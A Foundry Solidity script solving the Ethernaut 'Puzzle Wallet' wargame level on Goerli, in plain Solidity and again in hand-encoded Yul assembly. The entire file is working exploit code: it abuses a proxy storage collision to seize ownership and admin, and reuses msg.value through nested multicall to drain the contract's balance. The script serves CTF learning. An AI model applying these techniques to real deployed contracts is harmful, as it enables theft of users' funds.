// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

interface Instance {
    function owner() external view returns (address);

    function pendingAdmin() external view returns (address);

    function admin() external view returns (address);

    function maxBalance() external view returns (uint256);

    function balances(address) external view returns (uint256);

    function init(uint256 _maxBalance) external;

    function proposeNewAdmin(address _newAdmin) external;

    function addToWhitelist(address addr) external;

    function setMaxBalance(uint256 _maxBalance) external;

    function deposit() external payable;

    function multicall(bytes[] calldata data) external payable;

    function execute(address to, uint256 value, bytes calldata data) external payable;
}

contract PuzzleWalletScript is EthernautScript {
    string network = "goerli";
    address level = 0x4dF32584890A0026e56f7535d0f2C6486753624f;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0.001 ether));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        instance.proposeNewAdmin(player);
        instance.addToWhitelist(player);

        uint256 value = 0.001 ether;

        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory subdata = new bytes[](1);
        subdata[0] = abi.encodeWithSignature("deposit()");
        data[1] = abi.encodeWithSignature("multicall(bytes[])", subdata);

        instance.multicall{ value: value }(data);

        instance.execute(player, value * 2, "");
        instance.setMaxBalance(uint256(uint160(player)));

        require(instance.admin() == player);
    }

    function yulVersion() internal {
        assembly {
            function callWithPlayer(destination, playerAddress, signature, sigLength) {
                mstore(0, signature)
                mstore(0, keccak256(0, sigLength))
                mstore(4, playerAddress)
                let success := call(gas(), destination, 0, 0, 0x24, 0, 0)
                if iszero(success) {
                    revert(0, 0)
                }
            }

            let _player := sload(player.slot)
            let _instance := sload(instance.slot)

            callWithPlayer(_instance, _player, "proposeNewAdmin(address)", 24)
            callWithPlayer(_instance, _player, "addToWhitelist(address)", 23)

            let value := exp(10, 15)

            // get `deposit()` selector
            mstore(0, "deposit()")
            mstore(0, keccak256(0, 9))
            let depositSelector := and(mload(0), shl(224, sub(exp(2, 32), 1)))

            // get `multicall(bytes[])` selector
            mstore(0, "multicall(bytes[])")
            mstore(0, keccak256(0, 18))
            let multicallSelector := and(mload(0), shl(224, sub(exp(2, 32), 1)))

            // Next we want to encode all the calldata for the multicall
            // This is going to be annoying, but it's part of the learning process
            // checkout the article associated with the repo for better explanations
            let fmp := mload(0x40)
            mstore(fmp, multicallSelector)
            mstore(add(fmp, 4), 0x20)
            mstore(add(fmp, 0x24), 2)
            mstore(add(fmp, 0x44), 0x40)
            mstore(add(fmp, 0x64), 0x80)
            mstore(add(fmp, 0x84), 4)
            mstore(add(fmp, 0xa4), depositSelector)

            let secondMulticallOffset := add(fmp, 0xc4)
            mstore(secondMulticallOffset, 0xa4) // 0xa4 is the length of the parameters for the second multicall
            mstore(add(secondMulticallOffset, 0x20), multicallSelector)
            secondMulticallOffset := add(secondMulticallOffset, 0x24) // it will be easier to keep track of the offset
            mstore(secondMulticallOffset, 0x20)
            mstore(add(secondMulticallOffset, 0x20), 1)
            mstore(add(secondMulticallOffset, 0x40), 0x20)
            mstore(add(secondMulticallOffset, 0x60), 4)
            mstore(add(secondMulticallOffset, 0x80), depositSelector)
            let success := call(gas(), _instance, value, fmp, 0x1a4, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            // call the `execute()` function
            // since we dont need anymore what we stored in memory for the multicall,
            // we'll just reuse the free memory pointer, no need to increase it and write to unused memory
            mstore(fmp, "execute(address,uint256,bytes)")
            mstore(fmp, keccak256(fmp, 30))
            mstore(add(fmp, 4), _player)
            mstore(add(fmp, 0x24), mul(value, 2))
            // the last parameter will be an empty `bytes`
            mstore(add(fmp, 0x44), 0x60) // we store the offset of the `data` parameter
            mstore(add(fmp, 0x64), 0) // it will be empty, so we can just set it to 0
            success := call(gas(), _instance, 0, fmp, 0x84, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            // call: setMaxBalance
            mstore(0, "setMaxBalance(uint256)")
            mstore(0, keccak256(0, 22))
            mstore(4, _player)
            success := call(gas(), _instance, 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            // require(instance.admin() == player);
            mstore(0, "admin()")
            mstore(0, keccak256(0, 7))
            pop(staticcall(gas(), _instance, 0, 4, 0, 0x20))
            if iszero(eq(mload(0), _player)) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
